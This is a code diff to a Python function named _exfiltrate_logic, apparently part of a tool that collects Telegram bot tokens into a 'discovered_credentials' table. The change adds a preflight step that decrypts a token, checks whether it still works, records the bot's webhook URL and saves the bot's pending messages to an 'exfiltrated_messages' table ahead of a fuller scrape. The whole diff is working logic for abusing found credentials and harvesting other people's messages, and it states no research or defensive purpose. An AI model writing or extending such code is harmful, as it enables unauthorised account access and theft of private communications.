@@ -76,7 +76,7 @@ async def _exfiltrate_logic(cred_id: str):
     )
     
     # Fetch credential
-    response = await async_execute(db.table("discovered_credentials").select("bot_token, chat_id").eq("id", cred_id))
+    response = await async_execute(db.table("discovered_credentials").select("bot_token, chat_id, meta").eq("id", cred_id))
     if not response.data:
         logger.error(f"❌ [Exfil] Credential {cred_id} not found in DB.")
         return f"Credential {cred_id} not found."
@@ -84,6 +84,7 @@ async def _exfiltrate_logic(cred_id: str):
     record = response.data[0]
     encrypted_token = record["bot_token"]
     chat_id = record["chat_id"]
+    current_meta = record.get("meta") or {}
 
     logger.info(f"    [Exfil] Found Chat ID: {chat_id}")
 
@@ -128,6 +129,33 @@ async def _exfiltrate_logic(cred_id: str):
         logger.error(f"❌ [Exfil] Decrypted token has invalid format for {cred_id}. Marking revoked.")
         await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
         return f"Invalid token format after decryption for {cred_id}"
+
+    # HTTP Preflight Check — verify token before heavy scrape
+    try:
+        updates, meta_info, is_revoked = await scraper_service._http_preflight_check(bot_token)
+        if is_revoked:
+            await async_execute(
+                db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id)
+            )
+            return "Record inactive; marked revoked during preflight."
+        if meta_info.get("webhook_url"):
+            merged_meta = dict(current_meta)
+            merged_meta["webhook_url"] = meta_info["webhook_url"]
+            await async_execute(
+                db.table("discovered_credentials").update({"meta": merged_meta}).eq("id", cred_id)
+            )
+        if updates:
+            for u in updates:
+                u["credential_id"] = cred_id
+            await async_execute(
+                db.table("exfiltrated_messages").upsert(
+                    updates,
+                    on_conflict="credential_id,telegram_msg_id",
+                    ignore_duplicates=True
+                )
+            )
+    except Exception as e:
+        logger.warning(f"⚠️ [Exfil] Preflight check failed for {cred_id}: {e}")
 
     # Scrape
     try:
